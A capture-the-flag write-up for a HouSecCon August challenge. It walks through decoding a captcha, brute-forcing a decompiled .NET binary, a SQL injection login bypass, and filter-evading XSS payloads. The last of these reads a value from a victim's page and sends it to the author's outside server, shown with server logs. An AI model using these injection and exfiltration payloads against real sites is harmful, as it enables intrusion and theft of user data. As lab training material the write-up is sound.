# August challenges for HouSecCon

```
* thebarbershopper has joined the channel

<malvin> welcome back our p0tat0heads legion. I have to say, great job on our first attack against Anextio. We have been processing the data we have extracted and come to a few conclusions:

1. Anextio is offering a service called CADRE. This is where things start to smell. I'm not sure how they can boast such a service, but we suspect that there is legitimacy behind their claims. Here is your challenge: find out the definition for CADRE acronym. Our social engineering efforts have been failing because there is an alternate definition that we haven't been able to find yet.

2. We extracted the following binary from their CADRE server. We believe there is valuable data that might give us more information on what hardware is behind CADRE. <./dial.exe> 

3. There is a hidden administrative login on the Anextio website. Get access, as our efforts have failed thus far. http://anextio.com/YWRtaW5pc3RyYXRpb25z/login

4. Once you get administrative access, we need to extract the IP address of the CADRE server. It appears to be redacted for our user, but maybe the others may have access. 

<Jim Sting> quit talking already Malvin! get hacking p0tat0heads!
```

## Captcha

Solve the captcha: `120117124101124117`

* Split the captcha is groups of 3
* Convert each set to a letter
* Offset the answer in order to pass to a substitution solver

```python
>>> cap = '120117124101124117'
>>> for offset in xrange(20):
...     print ''.join([chr(int(cap[x:x+3])-offset) for x in xrange(0, len(cap), 3)])
...
xu|e|u
wt{d{t
vszczs
urybyr
tqxaxq <-- Looks good for rumkin to solve.
spw`wp
rov_vo
qnu^un
pmt]tm
ols\sl
nkr[rk
mjqZqj
lipYpi
khoXoh
jgnWng
ifmVmf
helUle
gdkTkd
fcjSjc
ebiRib
```

Pass one of our answers to rumkin and look at answers.

![Picture of solved substitution vipher](/pics/cap.png)

Due to the theme, try `POTATO` and register as user

## What is CADRE
```
1. Anextio is offering a service called CADRE. This is where things start to smell. I'm not sure how they can boast such a service, but we suspect that there is legitimacy behind their claims. Here is your challenge: find out the definition for CADRE acronym. Our social engineering efforts have been failing because there is an alternate definition that we haven't been able to find yet.
```

At first glance at the www.anextio.com website, CADRE stands for Cybersecurity Advanced Defense and Response Environment.
Upon trying this, no dice. Looking further down the page, the `A` could also mean `Adaptable`. Trying the following worked:

```
Cybersecurity Adaptable Defense and Response Environment.
```

## dial.exe
```
2. We extracted the following binary from their CADRE server. We believe there is valuable data that might give us more information on what hardware is behind CADRE. <./dial.exe> 
```

Yay! A binary! My kind of challenge:

```
PE32 executable for MS Windows (console) Intel 80386 Mono/.Net assembly
```

![Are you kidding me](http://images.sodahead.com/polls/004110707/235434734_Are_You_Kidding_Me_answer_11_xlarge.jpeg)

Oh well, it's .NET. We know that .NET can be decompiled to source using (dotPeek)[https://www.jetbrains.com/decompiler/].

Looking at the source, it looks like we are given a fake terminal to attempt to wardial a given phone number. We are also given an area code and a set of prefixes. The source shows that if a certain `Dial` function succeeds, the terminal closes. We should be able to brute force this:

* Copy/pasta the source from dotPeek into our own script
* Write a few for loops to isolate the area code and prefix
* If we "successfully" decode the cipher string, append that solution to a file
* Check the output file to see if we can read anything

A sample for loop is below:

```
  public static void Main()
  {
    long i;
    string words;
    while (true)
    {
        for(i = 3117670000; i < 3117680000; i++){
            words = Dialer.Dial(i);
            if (string.IsNullOrEmpty(words))
            {
                Thread.Sleep(1);
            }
            else{
                string path = @"output-1.txt";
                using (StreamWriter sw = File.AppendText(path)) 
                {
                    sw.WriteLine(i);
                    sw.WriteLine(words);
                }    
            }
        }
    }
  }
```

Turns out, compiling this is easy in a Visual Studio shell.

```
csc dialer.cs
```

In order to quickly find if we have a good solution, a dumb check script was written to check if any more than half of a given line are letters.

```
import string
import glob
for filename in glob.glob('output*.txt'):
    data = open(filename, 'r').read().splitlines()

    for line in data:
        count = 0
        for c in line:
            if c in string.ascii_lowercase or c in string.ascii_uppercase:
                count = count + 1

        if count > (len(line)/2) and len(line) > 4:
            with open('winning', 'a') as f:
                f.write(line + '\n')
```

Several phone numbers output the following:

```
GREETINGS PROFESSOR FALKEN
```

I actually spent a good amount of time trying to find out the "hardware" of the machine. Turns out, the flag was the phone number all along.. Doh!

## Admin panel
```
3. There is a hidden administrative login on the Anextio website. Get access, as our efforts have failed thus far. http://anextio.com/YWRtaW5pc3RyYXRpb25z/login
```

Having a bit of fun on the admin panel shows that `'` actually returns a `500` error from the server, hinting at SQL Injection.
In trying a few things, `admin';--` returns a valid page. This tells us that we can successfully comment out the rest of the SQL query.

The next bit might seem like black magic, but it was the first thing I tried, and it worked.
Just as a common practice, I made sure to replace the spaces with a comment (as per a few other previous CTF challenges).
The `SELECT * FROM users` bit was a wild guess that happened to work. (shrug)

```
Username
admin'/**/UNION/**/SELECT/**/*/**/FROM/**/users;--
Password
aaaa
```

![Admin Panel](/pics/admin-panel.png)

## Get dat IP
```
4. Once you get administrative access, we need to extract the IP address of the CADRE server. It appears to be redacted for our user, but maybe the others may have access. 
```

This is where we get really annoyed. Our task was to discover the IP of the CADRE server that we have an interface to.

Seeing a message box and a few "Active" users, hints strongly towards Cross-Site Scripting. Testing a few generic XSS strings (`<script>alert('xss');</script>`) shows that the server is filtering a few things: `script`, `alert`, and `ip`. Our first task is to test that XSS is what we are looking for. Looking over previous XSS CTF challenges, I came across the following XSS string that successfully alerted for us:

```
<img/src="./"/onerror="&#0097;&#00108;&#00101;&#00114;&#00116;&#0040;&#0039;&#0088;&#0083;&#0083;&#0039;&#0041;">
```

[XSS 1](/pics/xss-1.png)


Our next task, is to test if our "Active" users are actually active. Sending a simple `<IMG>` tag to `ctaroot` trying to access an image on my AWS instance gives a successful request.

```
<IMG src="http://my.aws.instance/ctaroot.png"/>
```

```
# On AWS instance
$ python -m SimpleHTTPServer 80

65.128.52.100 - - [31/Aug/2015 19:15:13] "GET /ctaroot.png HTTP/1.1" 404 -
```

Awesome, so we do have "Active" users. As per typical XSS, let's try and steal the cookie for `ctaroot`. The idea being to submit an attacker generated form with the `ctaroot` cookie inside.

Below is the XSS payload:
```
<img/src="./"onerror="

// Create a new form and resubmit to 'send'
// the document.cookie of the current user
var/**/form/**/=/**/document.createElement('form');
form.setAttribute('method','post');
form.setAttribute('action','send');
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','to');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),'admin');
form.appendChild(hiddenField);
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','body');
// 'value' is stripped by server
// 'ip' is stripped by server
// hiddenField.setAttribute('value, document.cookie);
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.getElementById(String.fromCharCode(105,112))[String.fromCharCode(118,97,108,117,101)]);

form.appendChild(hiddenField);
document.body.appendChild(form);
form.submit();
"/>
```

Sending this gives a gorgeous non-flag:

```
You are not authorized to view messages from CTARoot.
```

I must admit. I was a bit stumped for a minute, but one must move forward. I made a guess that the `ctaroot` interface would be the same as mine and that the DOM would also be similar.

The next idea would be to try and pull the IP from the `ctaroot` DOM and then ship that instead of the cookie. The last thing would be to send this to an AWS instance instead of to `send`. Ultimately, this worked!

```
<img/src="./"onerror="

// Create a new form with the IP from the DOM
// Submit the form to a known AWS instance
var/**/form/**/=/**/document.createElement('form');
form.setAttribute('method','get');
form.setAttribute('action','http://my.aws.instance/send');
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','to');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),'admin');
form.appendChild(hiddenField);
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','body');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.getElementById(String.fromCharCode(105,112))[String.fromCharCode(118,97,108,117,101)]);
// 'ip' is stripped by server
// 'value' is stripped by server

form.appendChild(hiddenField);
document.body.appendChild(form);
form.submit();
"/>
```

```
# On the AWS instance
python -m SimpleHTTPServer 80

# Time passes
65.128.52.100 - - [31/Aug/2015 20:40:24] "GET /send?to=admin&body=+10.201.40.147 HTTP/1.1" 404 -
``` 

Submitting this IP, finishes the August edition of HouSecCon CTF.

Here's to hoping for binary exploitation for the September edition ;-)
